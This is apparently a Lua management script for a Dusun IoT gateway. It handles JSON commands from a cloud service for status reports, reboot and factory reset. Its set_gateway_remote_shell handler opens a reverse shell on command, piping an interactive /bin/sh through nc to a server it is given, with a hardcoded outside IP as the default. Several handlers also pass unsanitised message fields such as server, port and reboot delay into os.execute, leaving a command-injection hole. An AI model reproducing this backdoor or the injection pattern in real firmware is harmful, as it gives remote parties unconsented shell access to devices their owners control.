#!/usr/bin/lua

local json = require("luci.json")
local io = require("io")
local fs = require("nixio.fs")
local os = require("os")

CODE_SUCCESS                  = 0      -- // 成功
CODE_NXP_SECURITY_HANDINGSHAKE= 96 	-- // NXP加锁和设备时，设备已经通讯上，正在进行加密握手操作
CODE_UPGRADE_STARTED          = 97     -- // 升级开始
CODE_UPGRADE_SUCCESS          = 98     -- // 升级成功
CODE_WAIT_TO_EXECUTE          = 99     -- // 命令已经收到，等待执行
CODE_UNKNOW_ERROR             = 199    -- // 未知错误
CODE_WRONG_FORMAT             = 101    -- // 报文格式错误
CODE_UNKNOW_DEVICE            = 102    -- // 未知的设备，指定的设备不存在
CODE_UNKNOW_ATTRIBUTE         = 103    -- // 未知的属性值
CODE_TIMEOUT                  = 104    -- // 操作超时
CODE_BUSY                     = 105    -- // 设备忙，已经有待执行的命令，且这个命令不能同时进行
CODE_UNKNDOW_CMD              = 106    -- // 未知的命令
CODE_NOT_SUPPORTED            = 107    -- // 不支持的操作
CODE_UPGRADE_MD5SUM_FAILED    = 108    -- // 升级时MD5SUM校验失败
CODE_UPGRADE_DOWNLOAD_FAILED  = 109    -- // 升级时固件下载失败
CODE_UPGRADE_FAILED           = 110    -- // 升级失败
CODE_PASSWORD_ALREADY_EXISTS  = 111    -- // 密码已经存在
CODE_PASSWORD_FULL            = 112    -- // 密码表已经满了
CODE_PASSWORD_NOT_EXISTS      = 113    -- // 要删除的密码不成功
CODE_MINUS_1                  = -1     -- // 未执行且不再执行的命令，由服务端更新

g_device_code	= ""

function uptime() 
	file=io.open("/proc/uptime", "r")
	if (file == nil) then
		return "0"
	end
	ut = file:read("*n")
	-- print(ut)
	file:close()
	return math.floor(ut)
end
function get_version() 
	file=io.open("/etc/dusun_build", "r")
	if (file == nil) then
		return "unknown"
	end
	ver = file:read("*l")
	file:close()
	-- print(ver)
	ver = string.gsub(ver, "%s+", "")
	return string.gsub(ver, "BUILD_VERSION=", "")
end
function get_model()
	model=fs.readfile("/tmp/sysinfo/model")
	return  string.gsub(model, "%s+", "")
end
function get_factory()
	return "dusun"
end

function gwmac() 
	mac=fs.readfile("/sys/class/net/eth0/address")
	return  string.gsub(mac, "%s+", "")
end

function get_devcode() 
	if (g_device_code ~= "") then
		return g_device_code
	end
	file=io.open("/etc/dusun/device_code")
	if (file ~= nil) then
		g_device_code=fs.readfile("/etc/dusun/device_code")
		file:close()
	end
	return g_device_code
end

function set_devcode(deviceCode) 
	g_device_code = deviceCode
	fs.writefile("/etc/dusun/device_code", deviceCode)
end

function time() 
	return os.time()	
end

function reg(str)
	return "reg"
end

function unreg(str) 
	return "unreg"
end

function rptatr(str) 
	return "rptatr"
end

function rptcmd(str)
	return "rptcmd"
end

function getatr(str)
	return "getatr"
end

function setatr(str)
	return "setatr"
end

function zclcmd(str) 
	return "zclcmd"
end

function rspcmd(_id, _code) 
	return {
		from		=	"GATEWAY",
		to		=	"CLOUD", 
		mac		=	gwmac(), 
		type		=	"registerResp",
		time		=	time(), 
		deviceCode	=	get_devcode(),
		id		= 	_id,
		data		= 	{
			code		=	_code,
			deviceCode 	= get_devcode(),
			mac		= gwmac()
		}
	}
end

function rspnull() 
	return {}
end

function ubus_send(to, msg) 
	pkt={PKT = msg}
	-- print('ubus send DS.' .. string.gsub(json.encode(to),'%"', "") .. ' ' .. '\'' .. json.encode(pkt) .. '\'')
	os.execute('ubus send DS.' .. string.gsub(json.encode(to),'%"', "") .. ' \'' .. json.encode(pkt) .. '\'')
end

function gwstatus() 
	return {
		from		=	"GATEWAY",
		to		=	"CLOUD", 
		mac		=	gwmac(), 
		type		=	"reportAttribute",
		time		=	time(), 
		deviceCode	=	get_devcode(),
		data		= 	{
			mac		= gwmac(),
			attribute	= "gateway.status",
			value 		= {
	 			version 	= get_version(),
				model		= get_model(),
				factory		= get_factory(),
				current_time	= time(),
				uptime		= uptime(),
				wireless	= "",
				ethernet_ip	= "",
				uplinkType	= ""
			}
		}
	}
end

function gwregister() 
	return {
		from		=	"GATEWAY",
		to		=	"CLOUD", 
		mac		=	gwmac(), 
		type		=	"registerReq",
		time		=	time(), 
		data		= 	{
			mac		= gwmac(),
			license = get_factory(),
			factory = get_factory(),
		}
	}
end


function get_gateway_status(jcmd) 
	return gwstatus()
end

function set_gateway_remote_shell(jcmd) 
	data = jcmd['data']
	id = data['id']
	arg = data['arguments']
	value = arg['value']
	server = value['server'] or '114.215.195.44'
	port = value['port'] or 3234
	
	os.execute('(rm -rf /tmp/rmt_pipe && mkfifo /tmp/rmt_pipe && /bin/sh -i 2>&1 < /tmp/rmt_pipe | nc ' .. server .. ' ' .. port .. ' >/tmp/rmt_pipe) &')
	
	return  rspcmd(id, CODE_SUCCESS)
end

function set_gateway_reboot(jcmd) 
	data = jcmd['data']
	id = data['id']
	arg = data['arguments']
	value = arg['value']
	reboot_delay = value['reboot_delay'] or 5

	os.execute('(sleep ' .. reboot_delay .. ' && reboot) &')

	return rspcmd(id, CODE_SUCCESS)
end

function set_gateway_upgrade_firmware(jcmd)
	return rspcmd(id, CODE_NOT_SUPPORTED)
end
function set_gateway_mqtt_server(jcmd) 
	return rspcmd(id, CODE_NOT_SUPPORTED)
end

function set_gateway_current_time(jcmd)
	return rspcmd(id, CODE_NOT_SUPPORTED)
end

function set_gateway_factory_reset(jcmd) 
	data = jcmd['data']
	id = data['id']
	arg = data['arguments']
	value = arg['value']
	
	os.execute('(sleep 5 && firstboot -y; reboot) &')

	return rspcmd(id, CODE_SUCCESS)
end

local attr_handlers = {
	gateway_status			= { get = get_gateway_status, set = nil },
	gateway_remote_shell		= { get = nil, 	set = set_gateway_remote_shell },
	gateway_reboot			= { get = nil,	set = set_gateway_reboot },

	gateway_upgrade_firmware	= { get = nil, 	set = set_gateway_upgrade_firmware},
	gateway_change_server		= { get = nil, 	set = set_gateway_mqtt_server },
	gateway_current_time		= { get = nil,	set = set_gateway_current_time },
	gateway_facorty_reset		= { get = nil,	set = set_gateway_factory_reset },
}

function typ_cmd_handler(jcmd) 
	print('typ_cmd_handler')
	id = jcmd['data']['id']
	data = jcmd['data']

	print(json.encode(data))

	-- if (data['command'] == nil or json.decode(type(data['command'])) ~= "string") then
	if (data['command'] == nil ) then
		print('command error')
		return rspcmd(id,  CODE_WRONG_FORMAT)
	end
	-- if (data['arguments'] == nil or type(data['arguments']) ~= "table") then
	if (data['arguments'] == nil) then
		print('arguments error')
		return rspcmd(id, CODE_WRONG_FORMAT)
	end
	arg = data['arguments']
	-- if (arg['attribute'] == nil or type(arg['attribute']) ~= "string") then
	if (arg['attribute'] == nil) then
		print('attribute error')
		return rspcmd(id, CODE_WRONG_FORMAT)
	end
	-- if (arg['mac'] == nil or type(arg['mac']) ~= "string") then
	if (arg['mac'] == nil) then
		print('arguments error')
		return rspcmd(id, CODE_WRONG_FORMAT)
	end
	cmd = data['command']
	if (cmd == "setAttribute") then
		-- if (arg['value'] == nil or type(arg['value']) ~= "table") then
		if (arg['value'] == nil) then
			print('value error')
			return rspcmd(id, CODE_WRONG_FORMAT)
		end
	end

	attr = json.encode(arg['attribute'])
	attr = string.gsub(attr, '%.', '_')
	attr = string.gsub(attr, '%"', "")
	if (cmd =="getAttribute") then
		if (attr_handlers[attr] == nil or attr_handlers[attr].get == nil) then
			print('unknown get cmd')
			return rspcmd(id, CODE_UNKNDOW_CMD)
		end
		return attr_handlers[attr].get(jcmd)
	else
		-- if (attr_handlers["gateway_remote_shell"] == nil) then
		if (attr_handlers[attr] == nil or attr_handlers[attr].set == nil) then
			print('unknow set cmd : ' .. attr)
			return rspcmd(id, CODE_UNKNDOW_CMD)
		end
		return attr_handlers[attr].set(jcmd)
	end
end

function rpt_rsp_handler(jcmd) 
	print('rpt_rsp_handler')
	return rspnull()
end

function reg_rsp_handler(jcmd) 
	print('reg_rsp_handler')
	data=jcmd['data']
	--if (data['code'] == nil or type(data['code']) ~= "number") then
	if (data['code'] == nil) then
		return  rspnull()
	end
	deviceCode = data['deviceCode']
	print(deviceCode)
	set_devcode(deviceCode)
	return gwstatus()
end

local type_handlers = {
	cmd 			= typ_cmd_handler,
	reportAttributeResp	= rpt_rsp_handler,
	registerResp		= reg_rsp_handler
}

function handler_msg(jmsg) 
	if (jmsg['type'] == nil) then
		return rspnull()
	end
	
	type = jmsg['type']
	if (type ~= 'reportAttribute' and type ~= 'cmdResult') then
		return rspnull()
	end
	if (jmsg['data'] == nil) then
		return rspnull()
	end
	
	data = jmsg['data']
	if (data['id'] ~= nil) then
		id = data['id']
		data['id'] = string.sub(id, 5, -1)
	end
	-- print(json.encode(jmsg))
	return jmsg
end

function handler_cmd(jcmd) 
	if (jcmd['from'] == nil or jcmd['from'] ~= 'CLOUD')  then
		print('from error')
		return rspcmd(0, CODE_WRONG_FORMAT)
	end
	if (jcmd['to'] == nil) then
		print('to error')
		return rspcmd(0, CODE_WRONG_FORMAT)
	end
	if (jcmd['time'] == nil) then
		print('time error')
		jcmd['time'] = time()
		-- return rspcmd(0, CODE_WRONG_FORMAT)
	end
	if (jcmd['deviceCode'] == nil) then
		jcmd['deviceCode'] = get_devcode()
		-- return rspcmd(0, CODE_WRONG_FORMAT)
	end
	if (jcmd['mac'] == nil or jcmd['mac'] ~= gwmac() ) then
		print('mac error')
		return rspcmd(0, CODE_WRONG_FORMAT)
	end
	if (jcmd['type'] == nil) then
		print('type error')
		return rspcmd(0, CODE_WRONG_FORMAT)
	end
	if (jcmd['data'] == nil or type(jcmd['data']) ~= "table") then
		print('data error')
		return rspcmd(0, CODE_WRONG_FORMAT)
	end

	if (jcmd['to'] ~= 'GATEWAY') then
		-- if (jcmd['data']['id'] == nil or type(jcmd['data']['id']) ~=  "string") then
		if (jcmd['data']['id'] == nil) then
			print('id error')
			return rspcmd(0, CODE_WRONG_FORMAT)
		end
		jcmd['data']['id'] = '&&' .. 'm_' .. jcmd['data']['id']
		ubus_send(jcmd['to'], jcmd)
		return rspnull()
	end

	type=jcmd['type']
	if (type_handlers[type] == nil) then
		print('type not support:' .. type)
		return rspcmd(0, CODE_NOT_SUPPORTED)
	end
	
	print('type_handlers ' .. type)
	return type_handlers[type](jcmd)
end

function msgin(msg) 
	jmsg = json.decode(msg)
	
	print('jmsg is' .. msg)
	
	jret = handler_msg(jmsg)
	
	sret = json.encode(jret)

	return sret
end

function cmdin(cmd) 
	jcmd = json.decode(cmd)
	
	print('jcmd is' .. cmd)
	
	jret = handler_cmd(jcmd)

	sret = json.encode(jret)

	print('sret is ' .. sret)
		
	return sret
end

function parse_class_cmd(ep, clsid, cmdid, buf) 
	print('ep:' .. ep .. ',clsid:' .. clsid .. ',cmdid:' .. cmdid .. ',buf:' .. buf)
	-- cmdin(json.encode(gwregister()))
	if (clsid  == '25') then
		if (cmdid == '03') then
			if (buf == 'FF') then
				return json.encode({value = "1", attribute = "device.onoff"})
			else
				return json.encode({value = "0", attribute = "device.onoff"})
			end
		else
				return json.encode({value = "2", attribute = "device.onoff"})
		end
	else
		return json.encode({value = "2", attribute = "device.onoff"})
	end
end

function callf(fname) 
	if (type(fname) ~= "string")  then
		return json.encode(rspnull())
	end
	if (type(_G) ~= "table") then
		return json.encode(rspnull())
	end
	local f = _G[fname]

	--[[
	for v in fname:gmatch("[^%.]+") do
		if (type(f) ~= "table") then
			return json.encode(rspnull())
		end
		f=f[v]
	end
	--]]

	if (type(f) ~= "function") then
		return json.encode(rspnull())
	end
	
	s=json.encode(f())
	-- print(s)
	return s
end

-- cmd={from="CLOUD", to="GATEWAY"}
-- print(cmdin(json.encode(cmd)))
-- callf("gwstatus")
-- cmdin(json.encode(gwregister()))


